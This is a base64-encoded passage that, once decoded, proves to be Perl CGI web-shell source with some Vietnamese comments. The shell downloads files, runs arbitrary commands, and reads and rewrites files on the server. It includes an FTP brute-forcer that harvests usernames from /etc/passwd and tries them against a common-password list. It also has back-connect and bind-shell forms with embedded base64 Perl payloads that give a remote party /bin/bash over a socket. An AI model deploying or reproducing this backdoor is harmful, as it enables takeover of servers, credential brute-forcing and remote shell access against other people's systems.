tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgRG93bmxvYWRGaWxlDQp7DQoJIyBpZiBubyBmaWxlIGlzIHNwZWNpZmllZCwgcHJpbnQgdGhlIGRvd25sb2FkIGZvcm0gYWdhaW4NCglpZigkVHJhbnNmZXJGaWxlIGVxICIiKQ0KCXsNCgkJJlByaW50UGFnZUhlYWRlcigiZiIpOw0KCQlyZXR1cm4gJlByaW50RmlsZURvd25sb2FkRm9ybTsNCgl9DQoJDQoJIyBnZXQgZnVsbHkgcXVhbGlmaWVkIHBhdGggb2YgdGhlIGZpbGUgdG8gYmUgZG93bmxvYWRlZA0KCWlmKCgkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cXHxeLjovKSkgfCAoISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUNCgl7DQoJCSRUYXJnZXRGaWxlID0gJFRyYW5zZmVyRmlsZTsNCgl9DQoJZWxzZSAjIHBhdGggaXMgcmVsYXRpdmUNCgl7DQoJCWNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87DQoJCSRUYXJnZXRGaWxlIC49ICRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7DQoJfQ0KDQoJaWYoJE9wdGlvbnMgZXEgImdvIikgIyB3ZSBoYXZlIHRvIHNlbmQgdGhlIGZpbGUNCgl7DQoJCXJldHVybiAmU2VuZEZpbGVUb0Jyb3dzZXIoJFRhcmdldEZpbGUpOw0KCX0NCgllbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQ0KCXsNCgkJcmV0dXJuICZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOw0KCX0NCn0NCg0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHRvIGV4ZWN1dGUgY29tbWFuZHMuIEl0IGRpc3BsYXlzIHRoZSBvdXRwdXQgb2YgdGhlDQojIGNvbW1hbmQgYW5kIGFsbG93cyB0aGUgdXNlciB0byBlbnRlciBhbm90aGVyIGNvbW1hbmQuIFRoZSBjaGFuZ2UgZGlyZWN0b3J5DQojIGNvbW1hbmQgaXMgaGFuZGxlZCBkaWZmZXJlbnRseS4gSW4gdGhpcyBjYXNlLCB0aGUgbmV3IGRpcmVjdG9yeSBpcyBzdG9yZWQgaW4NCiMgYW4gaW50ZXJuYWwgdmFyaWFibGUgYW5kIGlzIHVzZWQgZWFjaCB0aW1lIGEgY29tbWFuZCBoYXMgdG8gYmUgZXhlY3V0ZWQuIFRoZQ0KIyBvdXRwdXQgb2YgdGhlIGNoYW5nZSBkaXJlY3RvcnkgY29tbWFuZCBpcyBub3QgZGlzcGxheWVkIHRvIHRoZSB1c2Vycw0KIyB0aGVyZWZvcmUgZXJyb3IgbWVzc2FnZXMgY2Fubm90IGJlIGRpc3BsYXllZC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBFeGVjdXRlQ29tbWFuZA0Kew0KCW15ICRyZXN1bHQ9IiI7DQoJaWYoJFJ1bkNvbW1hbmQgPX4gbS9eXHMqY2RccysoLispLykgIyBpdCBpcyBhIGNoYW5nZSBkaXIgY29tbWFuZA0KCXsNCgkJIyB3ZSBjaGFuZ2UgdGhlIGRpcmVjdG9yeSBpbnRlcm5hbGx5LiBUaGUgb3V0cHV0IG9mIHRoZQ0KCQkjIGNvbW1hbmQgaXMgbm90IGRpc3BsYXllZC4NCgkJJENvbW1hbmQgPSAiY2QgXCIkQ3VycmVudERpclwiIi4kQ21kU2VwLiJjZCAkMSIuJENtZFNlcC4kQ21kUHdkOw0KCQljaG9wKCRDdXJyZW50RGlyID0gYCRDb21tYW5kYCk7DQoJCSRyZXN1bHQgLj0gJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQoNCgkJJHJlc3VsdCAuPSAiQ29tbWFuZDogPHJ1bj4kUnVuQ29tbWFuZCA8L3J1bj48YnI+PHRleHRhcmVhIGNvbHM9JyRjb2xzJyByb3dzPSckcm93cycgc3BlbGxjaGVjaz0nZmFsc2UnPiI7DQoJCSMgeHVhdCB0aG9uZyB0aW4ga2hpIGNodXllbiBkZW4gMSB0aHUgbXVjIG5hbyBkbyENCgkJJFJ1bkNvbW1hbmQ9ICRXaW5OVD8iZGlyIjoiZGlyIC1saWEiOw0KCQkkcmVzdWx0IC49ICZSdW5DbWQ7DQoJfWVsc2lmKCRSdW5Db21tYW5kID1+IG0vXlxzKmVkaXRccysoLispLykNCgl7DQoJCSRyZXN1bHQgLj0gICZTYXZlRmlsZUZvcm07DQoJfWVsc2UNCgl7DQoJCSRyZXN1bHQgLj0gJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQoJCSRyZXN1bHQgLj0gIkNvbW1hbmQ6IDxydW4+JFJ1bkNvbW1hbmQ8L3J1bj48YnI+PHRleHRhcmVhIGlkPSdkYXRhJyBjb2xzPSckY29scycgcm93cz0nJHJvd3MnIHNwZWxsY2hlY2s9J2ZhbHNlJz4iOw0KCQkkcmVzdWx0IC49JlJ1bkNtZDsNCgl9DQoJJHJlc3VsdCAuPSAgIjwvdGV4dGFyZWE+IjsNCglyZXR1cm4gJHJlc3VsdDsNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBydW4gY29tbWFuZA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KDQpzdWIgUnVuQ21kDQp7DQoJbXkgJHJlc3VsdD0iIjsNCgkkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuJFJ1bkNvbW1hbmQuJFJlZGlyZWN0b3I7DQoJaWYoISRXaW5OVCkNCgl7DQoJCSRTSUd7J0FMUk0nfSA9IFwmQ29tbWFuZFRpbWVvdXQ7DQoJCWFsYXJtKCRDb21tYW5kVGltZW91dER1cmF0aW9uKTsNCgl9DQoJaWYoJFNob3dEeW5hbWljT3V0cHV0KSAjIHNob3cgb3V0cHV0IGFzIGl0IGlzIGdlbmVyYXRlZA0KCXsNCgkJJHw9MTsNCgkJJENvbW1hbmQgLj0gIiB8IjsNCgkJb3BlbihDb21tYW5kT3V0cHV0LCAkQ29tbWFuZCk7DQoJCXdoaWxlKDxDb21tYW5kT3V0cHV0PikNCgkJew0KCQkJJF8gPX4gcy8oXG58XHJcbikkLy87DQoJCQkkcmVzdWx0IC49ICZIdG1sU3BlY2lhbENoYXJzKCIkX1xuIik7DQoJCX0NCgkJJHw9MDsNCgl9DQoJZWxzZSAjIHNob3cgb3V0cHV0IGFmdGVyIGNvbW1hbmQgY29tcGxldGVzDQoJew0KCQkkcmVzdWx0IC49ICZIdG1sU3BlY2lhbENoYXJzKCckQ29tbWFuZCcpOw0KCX0NCglpZighJFdpbk5UKQ0KCXsNCgkJYWxhcm0oMCk7DQoJfQ0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KIyBGb3JtIFNhdmUgRmlsZSANCiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCnN1YiBTYXZlRmlsZUZvcm0NCnsNCglteSAkcmVzdWx0ID0iIjsNCglzdWJzdHIoJFJ1bkNvbW1hbmQsMCw1KT0iIjsNCglteSAkZmlsZT0mdHJpbSgkUnVuQ29tbWFuZCk7DQoJJHNhdmU9Jzxicj48aW5wdXQgbmFtZT0iYSIgdHlwZT0ic3VibWl0IiB2YWx1ZT0ic2F2ZSIgY2xhc3M9InN1Ym1pdCIgPic7DQoJJEZpbGU9JEN1cnJlbnREaXIuJFBhdGhTZXAuJFJ1bkNvbW1hbmQ7DQoJbXkgJGRpcj0iPHNwYW4gc3R5bGU9J2ZvbnQ6IDExcHQgVmVyZGFuYTsgZm9udC13ZWlnaHQ6IGJvbGQ7Jz4iLiZBZGRMaW5rRGlyKCJndWkiKS4iPC9zcGFuPiI7DQoJaWYoLXcgJEZpbGUpDQoJew0KCQkkcm93cz0iMjMiDQoJfWVsc2UNCgl7DQoJCSRtc2c9Ijxicj48Zm9udCBzdHlsZT0nZm9udDogMTVwdCBWZXJkYW5hOyBjb2xvcjogeWVsbG93OycgPiBQZXJtaXNzaW9uIGRlbmllZCE8Zm9udD48YnI+IjsNCgkJJHJvd3M9IjIwIg0KCX0NCgkkUHJvbXB0ID0gJFdpbk5UID8gIiRkaXIgPiAiIDogIjxmb250IGNvbG9yPScjRkZGRkZGJz5bYWRtaW5cQCRTZXJ2ZXJOYW1lICRkaXJdXCQ8L2ZvbnQ+ICI7DQoJJHJlYWQ9KCRXaW5OVCk/InR5cGUiOiJsZXNzIjsNCgkkUnVuQ29tbWFuZCA9ICIkcmVhZCBcIiRSdW5Db21tYW5kXCIiOw0KCSRyZXN1bHQgLj0gIDw8RU5EOw0KCTxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KDQoJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCgkkUHJvbXB0DQoJPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjQwIiBuYW1lPSJjIj4NCgk8aW5wdXQgbmFtZT0icyIgY2xhc3M9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iRW50ZXIiPg0KCTxicj5Db21tYW5kOiA8cnVuPiAkUnVuQ29tbWFuZCA8L3J1bj4NCgk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJmaWxlIiB2YWx1ZT0iJGZpbGUiID4gJHNhdmUgPGJyPiAkbXNnDQoJPGJyPjx0ZXh0YXJlYSBpZD0iZGF0YSIgbmFtZT0iZGF0YSIgY29scz0iJGNvbHMiIHJvd3M9IiRyb3dzIiBzcGVsbGNoZWNrPSJmYWxzZSI+DQpFTkQNCgkNCgkkcmVzdWx0IC49ICZSdW5DbWQ7DQoJJHJlc3VsdCAuPSAgIjwvdGV4dGFyZWE+IjsNCgkkcmVzdWx0IC49ICAiPC9mb3JtPiI7DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQojIFNhdmUgRmlsZQ0KIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0Kc3ViIFNhdmVGaWxlKCQpDQp7DQoJbXkgJERhdGE9IHNoaWZ0IDsNCglteSAkRmlsZT0gc2hpZnQ7DQoJJEZpbGU9JEN1cnJlbnREaXIuJFBhdGhTZXAuJEZpbGU7DQoJaWYob3BlbihGSUxFLCAiPiRGaWxlIikpDQoJew0KCQliaW5tb2RlIEZJTEU7DQoJCXByaW50IEZJTEUgJERhdGE7DQoJCWNsb3NlIEZJTEU7DQoJCXJldHVybiAxOw0KCX1lbHNlDQoJew0KCQlyZXR1cm4gMDsNCgl9DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIEJydXRlIEZvcmNlciBGb3JtDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQnJ1dGVGb3JjZXJGb3JtDQp7DQoJbXkgJHJlc3VsdD0iIjsNCgkkcmVzdWx0IC49IDw8RU5EOw0KDQo8dGFibGU+DQoNCjx0cj4NCjx0ZCBjb2xzcGFuPSIyIiBhbGlnbj0iY2VudGVyIj4NCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIzxicj4NClNpbXBsZSBGVFAgYnJ1dGUgZm9yY2VyPGJyPg0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjDQo8Zm9ybSBuYW1lPSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImJydXRlZm9yY2VyIi8+DQo8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZD5Vc2VyOjxicj48dGV4dGFyZWEgcm93cz0iMTgiIGNvbHM9IjMwIiBuYW1lPSJ1c2VyIj4NCkVORA0KY2hvcCgkcmVzdWx0IC49IGBsZXNzIC9ldGMvcGFzc3dkIHwgY3V0IC1kOiAtZjFgKTsNCiRyZXN1bHQgLj0gPDwnRU5EJzsNCjwvdGV4dGFyZWE+PC90ZD4NCjx0ZD4NCg0KUGFzczo8YnI+DQo8dGV4dGFyZWEgcm93cz0iMTgiIGNvbHM9IjMwIiBuYW1lPSJwYXNzIj4xMjNwYXNzDQoxMjMhQCMNCjEyM2FkbWluDQoxMjNhYmMNCjEyMzQ1NmFkbWluDQoxMjM0NTU0MzIxDQoxMjM0NDMyMQ0KcGFzczEyMw0KYWRtaW4NCmFkbWluY3ANCmFkbWluaXN0cmF0b3INCm1hdGtoYXUNCnBhc3NhZG1pbg0KcEBzc3dvcmQNCnBAc3N3MHJkDQpwYXNzd29yZA0KMTIzNDU2DQoxMjM0NTY3DQoxMjM0NTY3OA0KMTIzNDU2Nzg5DQoxMjM0NTY3ODkwDQoxMTExMTENCjAwMDAwMA0KMjIyMjIyDQozMzMzMzMNCjQ0NDQ0NA0KNTU1NTU1DQo2NjY2NjYNCjc3Nzc3Nw0KODg4ODg4DQo5OTk5OTkNCjEyMzEyMw0KMjM0MjM0DQozNDUzNDUNCjQ1NjQ1Ng0KNTY3NTY3DQo2Nzg2NzgNCjc4OTc4OQ0KMTIzMzIxDQo0NTY2NTQNCjY1NDMyMQ0KNzY1NDMyMQ0KODc2NTQzMjENCjk4NzY1NDMyMQ0KMDk4NzY1NDMyMQ0KYWRtaW4xMjMNCmFkbWluMTIzNDU2DQphYmNkZWYNCmFiY2FiYw0KIUAjIUAjDQohQCMkJV4NCiFAIyQlXiYqKA0KIUAjJCQjQCENCmFiYzEyMw0KYW5oeWV1ZW0NCmlsb3ZleW91PC90ZXh0YXJlYT4NCjwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkIGNvbHNwYW49IjIiIGFsaWduPSJjZW50ZXIiPg0KU2xlZXA6PHNlbGVjdCBuYW1lPSJzbGVlcCI+DQoNCjxvcHRpb24+MDwvb3B0aW9uPg0KPG9wdGlvbj4xPC9vcHRpb24+DQo8b3B0aW9uPjI8L29wdGlvbj4NCg0KPG9wdGlvbj4zPC9vcHRpb24+DQo8L3NlbGVjdD4gDQo8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0ic3VibWl0IiB2YWx1ZT0iQnJ1dGUgRm9yY2VyIi8+PC90ZD48L3RyPg0KPC9mb3JtPg0KPC90YWJsZT4NCkVORA0KcmV0dXJuICRyZXN1bHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIEJydXRlIEZvcmNlcg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEJydXRlRm9yY2VyDQp7DQoJbXkgJHJlc3VsdD0iIjsNCgkkU2VydmVyPSRFTlZ7J1NFUlZFUl9BRERSJ307DQoJaWYoJGlueyd1c2VyJ30gZXEgIiIpDQoJew0KCQkkcmVzdWx0IC49ICZCcnV0ZUZvcmNlckZvcm07DQoJfWVsc2UNCgl7DQoJCXVzZSBOZXQ6OkZUUDsgDQoJCUB1c2VyPSBzcGxpdCgvXG4vLCAkaW57J3VzZXInfSk7DQoJCUBwYXNzPSBzcGxpdCgvXG4vLCAkaW57J3Bhc3MnfSk7DQoJCWNob21wKEB1c2VyKTsNCgkJY2hvbXAoQHBhc3MpOw0KCQkkcmVzdWx0IC49ICI8YnI+PGJyPlsrXSBUcnlpbmcgYnJ1dGUgJFNlcnZlck5hbWU8YnI+PT09PT09PT09PT09PT09PT09PT0+Pj4+Pj4+Pj4+Pj48PDw8PDw8PDw8PT09PT09PT09PT09PT09PT09PT08YnI+PGJyPlxuIjsNCgkJZm9yZWFjaCAkdXNlcm5hbWUgKEB1c2VyKQ0KCQl7DQoJCQlpZighKCR1c2VybmFtZSBlcSAiIikpDQoJCQl7DQoJCQkJZm9yZWFjaCAkcGFzc3dvcmQgKEBwYXNzKQ0KCQkJCXsNCgkJCQkJJGZ0cCA9IE5ldDo6RlRQLT5uZXcoJFNlcnZlcikgb3IgZGllICJDb3VsZCBub3QgY29ubmVjdCB0byAkU2VydmVyTmFtZVxuIjsgDQoJCQkJCWlmKCRmdHAtPmxvZ2luKCIkdXNlcm5hbWUiLCIkcGFzc3dvcmQiKSkNCgkJCQkJew0KCQkJCQkJJHJlc3VsdCAuPSAiPGEgdGFyZ2V0PSdfYmxhbmsnIGhyZWY9J2Z0cDovLyR1c2VybmFtZTokcGFzc3dvcmRcQCRTZXJ2ZXInPlsrXSBmdHA6Ly8kdXNlcm5hbWU6JHBhc3N3b3JkXEAkU2VydmVyPC9hPjxicj5cbiI7DQoJCQkJCQkkZnRwLT5xdWl0KCk7DQoJCQkJCQlicmVhazsNCgkJCQkJfQ0KCQkJCQlpZighKCRpbnsnc2xlZXAnfSBlcSAiMCIpKQ0KCQkJCQl7DQoJCQkJCQlzbGVlcChpbnQoJGlueydzbGVlcCd9KSk7DQoJCQkJCX0NCgkJCQkJJGZ0cC0+cXVpdCgpOw0KCQkJCX0NCgkJCX0NCgkJfQ0KCQkkcmVzdWx0IC49ICJcbjxicj49PT09PT09PT09Pj4+Pj4+Pj4+PiBGaW5pc2hlZCA8PDw8PDw8PDw8PT09PT09PT09PTxicj5cbiI7DQoJfQ0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBCYWNrY29ubmVjdCBGb3JtDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQmFja0JpbmRGb3JtDQp7DQoJcmV0dXJuIDw8RU5EOw0KCTxicj48YnI+DQoNCgk8dGFibGU+DQoJPHRyPg0KCTxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KCTx0ZD5CYWNrQ29ubmVjdDogPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImJhY2tiaW5kIj48L3RkPg0KCTx0ZD4gSG9zdDogPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjIwIiBuYW1lPSJjbGllbnRhZGRyIiB2YWx1ZT0iJEVOVnsnUkVNT1RFX0FERFInfSI+DQoJIFBvcnQ6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSI3IiBuYW1lPSJjbGllbnRwb3J0IiB2YWx1ZT0iODAiIG9ua2V5dXA9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdiYScpLmlubmVySFRNTD10aGlzLnZhbHVlOyI+PC90ZD4NCg0KCTx0ZD48aW5wdXQgbmFtZT0icyIgY2xhc3M9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiBuYW1lPSJzdWJtaXQiIHZhbHVlPSJDb25uZWN0Ij48L3RkPg0KCTwvZm9ybT4NCgk8L3RyPg0KCTx0cj4NCgk8dGQgY29sc3Bhbj0zPjxmb250IGNvbG9yPSNGRkZGRkY+WytdIENsaWVudCBsaXN0ZW4gYmVmb3JlIGNvbm5lY3QgYmFjayENCgk8YnI+WytdIFRyeSBjaGVjayB5b3VyIFBvcnQgd2l0aCA8YSB0YXJnZXQ9Il9ibGFuayIgaHJlZj0iaHR0cDovL3d3dy5jYW55b3VzZWVtZS5vcmcvIj5odHRwOi8vd3d3LmNhbnlvdXNlZW1lLm9yZy88L2E+DQoJPGJyPlsrXSBDbGllbnQgbGlzdGVuIHdpdGggY29tbWFuZDogPHJ1bj5uYyAtdnYgLWwgLXAgPHNwYW4gaWQ9ImJhIj44MDwvc3Bhbj48L3J1bj48L2ZvbnQ+PC90ZD4NCg0KCTwvdHI+DQoJPC90YWJsZT4NCg0KCTxicj48YnI+DQoJPHRhYmxlPg0KCTx0cj4NCgk8Zm9ybSBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCgk8dGQ+QmluZCBQb3J0OiA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iYmFja2JpbmQiPjwvdGQ+DQoNCgk8dGQ+IFBvcnQ6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSIxNSIgbmFtZT0iY2xpZW50cG9ydCIgdmFsdWU9IjE0MTIiIG9ua2V5dXA9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdiaScpLmlubmVySFRNTD10aGlzLnZhbHVlOyI+DQoNCgkgUGFzc3dvcmQ6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSIxNSIgbmFtZT0iYmluZHBhc3MiIHZhbHVlPSJUSElFVUdJQUJVT04iPjwvdGQ+DQoJPHRkPjxpbnB1dCBuYW1lPSJzIiBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdCIgdmFsdWU9IkJpbmQiPjwvdGQ+DQoJPC9mb3JtPg0KCTwvdHI+DQoJPHRyPg0KCTx0ZCBjb2xzcGFuPTM+PGZvbnQgY29sb3I9I0ZGRkZGRj5bK10gQ2h1YyBuYW5nIGNodWEgZGMgdGVzdCENCgk8YnI+WytdIFRyeSBjb21tYW5kOiA8cnVuPm5jICRFTlZ7J1NFUlZFUl9BRERSJ30gPHNwYW4gaWQ9ImJpIj4xNDEyPC9zcGFuPjwvcnVuPjwvZm9udD48L3RkPg0KDQoJPC90cj4NCgk8L3RhYmxlPjxicj4NCkVORA0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBCYWNrY29ubmVjdCB1c2UgcGVybA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEJhY2tCaW5kDQp7DQoJdXNlIE1JTUU6OkJhc2U2NDsNCgl1c2UgU29ja2V0OwkNCgkkYmFja3Blcmw9Ikl5RXZkWE55TDJKcGJpOXdaWEpzRFFwMWMyVWdTVTg2T2xOdlkydGxkRHNOQ2lSVGFHVnNiQWs5SUNJdlltbHVMMkpoYzJnaU93MEtKRUZTUjBNOVFFRlNSMVk3RFFwMWMyVWdVMjlqYTJWME93MEtkWE5sSUVacGJHVklZVzVrYkdVN0RRcHpiMk5yWlhRb1UwOURTMFZVTENCUVJsOUpUa1ZVTENCVFQwTkxYMU5VVWtWQlRTd2daMlYwY0hKdmRHOWllVzVoYldVb0luUmpjQ0lwS1NCdmNpQmthV1VnY0hKcGJuUWdJbHN0WFNCVmJtRmliR1VnZEc4Z1VtVnpiMngyWlNCSWIzTjBYRzRpT3cwS1kyOXVibVZqZENoVFQwTkxSVlFzSUhOdlkydGhaR1J5WDJsdUtDUkJVa2RXV3pGZExDQnBibVYwWDJGMGIyNG9KRUZTUjFaYk1GMHBLU2tnYjNJZ1pHbGxJSEJ5YVc1MElDSmJMVjBnVlc1aFlteGxJSFJ2SUVOdmJtNWxZM1FnU0c5emRGeHVJanNOQ25CeWFXNTBJQ0pEYjI1dVpXTjBaV1FoSWpzTkNsTlBRMHRGVkMwK1lYVjBiMlpzZFhOb0tDazdEUXB2Y0dWdUtGTlVSRWxPTENBaVBpWlRUME5MUlZRaUtUc05DbTl3Wlc0b1UxUkVUMVZVTENJK0psTlBRMHRGVkNJcE93MEtiM0JsYmloVFZFUkZVbElzSWo0bVUwOURTMFZVSWlrN0RRcHdjbWx1ZENBaUxTMDlQU0JEYjI1dVpXTjBaV1FnUW1GamEyUnZiM0lnUFQwdExTQWdYRzVjYmlJN0RRcHplWE4wWlcwb0luVnVjMlYwSUVoSlUxUkdTVXhGT3lCMWJuTmxkQ0JUUVZaRlNFbFRWQ0E3WldOb2J5QW5XeXRkSUZONWMzUmxiV2x1Wm04NklDYzdJSFZ1WVcxbElDMWhPMlZqYUc4N1pXTm9ieUFuV3l0ZElGVnpaWEpwYm1adk9pQW5PeUJwWkR0bFkyaHZPMlZqYUc4Z0oxc3JYU0JFYVhKbFkzUnZjbms2SUNjN0lIQjNaRHRsWTJodk95QmxZMmh2SUNkYksxMGdVMmhsYkd3NklDYzdKRk5vWld4c0lpazdEUXBqYkc5elpTQlRUME5MUlZRNyI7DQoJJGJpbmRwZXJsPSJJeUV2ZFhOeUwySnBiaTl3WlhKc0RRcDFjMlVnVTI5amEyVjBPdzBLSkVGU1IwTTlRRUZTUjFZN0RRb2tjRzl5ZEFrOUlDUkJVa2RXV3pCZE93MEtKSEJ5YjNSdkNUMGdaMlYwY0hKdmRHOWllVzVoYldVb0ozUmpjQ2NwT3cwS0pGTm9aV3hzQ1QwZ0lpOWlhVzR2WW1GemFDSTdEUXB6YjJOclpYUW9VMFZTVmtWU0xDQlFSbDlKVGtWVUxDQlRUME5MWDFOVVVrVkJUU3dnSkhCeWIzUnZLVzl5SUdScFpTQWljMjlqYTJWME9pUWhJanNOQ25ObGRITnZZMnR2Y0hRb1UwVlNWa1ZTTENCVFQweGZVMDlEUzBWVUxDQlRUMTlTUlZWVFJVRkVSRklzSUhCaFkyc29JbXdpTENBeEtTbHZjaUJrYVdVZ0luTmxkSE52WTJ0dmNIUTZJQ1FoSWpzTkNtSnBibVFvVTBWU1ZrVlNMQ0J6YjJOcllXUmtjbDlwYmlna2NHOXlkQ3dnU1U1QlJFUlNYMEZPV1NrcGIzSWdaR2xsSUNKaWFXNWtPaUFrSVNJN0RRcHNhWE4wWlc0b1UwVlNWa1ZTTENCVFQwMUJXRU5QVGs0cENRbHZjaUJrYVdVZ0lteHBjM1JsYmpvZ0pDRWlPdzBLWm05eUtEc2dKSEJoWkdSeUlEMGdZV05qWlhCMEtFTk1TVVZPVkN3Z1UwVlNWa1ZTS1RzZ1kyeHZjMlVnUTB4SlJVNVVLUTBLZXcwS0NXOXdaVzRvVTFSRVNVNHNJQ0krSmtOTVNVVk9WQ0lwT3cwS0NXOXdaVzRvVTFSRVQxVlVMQ0FpUGlaRFRFbEZUbFFpS1RzTkNnbHZjR1Z1S0ZOVVJFVlNVaXdnSWo0bVEweEpSVTVVSWlrN0RRb0pjM2x6ZEdWdEtDSjFibk5sZENCSVNWTlVSa2xNUlRzZ2RXNXpaWFFnVTBGV1JVaEpVMVFnTzJWamFHOGdKMXNyWFNCVGVYTjBaVzFwYm1adk9pQW5PeUIxYm1GdFpTQXRZVHRsWTJodk8yVmphRzhnSjFzclhTQlZjMlZ5YVc1bWJ6b2dKenNnYVdRN1pXTm9ienRsWTJodklDZGJLMTBnUkdseVpXTjBiM0o1T2lBbk95QndkMlE3WldOb2J6c2daV05vYnlBbld5dGRJRk5vWld4c09pQW5PeVJUYUdWc2JDSXBPdzBLQ1dOc2IzTmxLRk5VUkVsT0tUc05DZ2xqYkc5elpTaFRWRVJQVlZRcE93MEtDV05zYjNObEtGTlVSRVZTVWlrN0RRcDlEUW89IjsNCg0KCSRDbGllbnRBZGRyID0gJGlueydjbGllbnRhZGRyJ307DQoJJENsaWVudFBvcnQgPSBpbnQoJGlueydjbGllbnRwb3J0J30pOw0KCWlmKCRDbGllbnRQb3J0IGVxIDApDQoJew0KCQlyZXR1cm4gJkJhY2tCaW5kRm9ybTs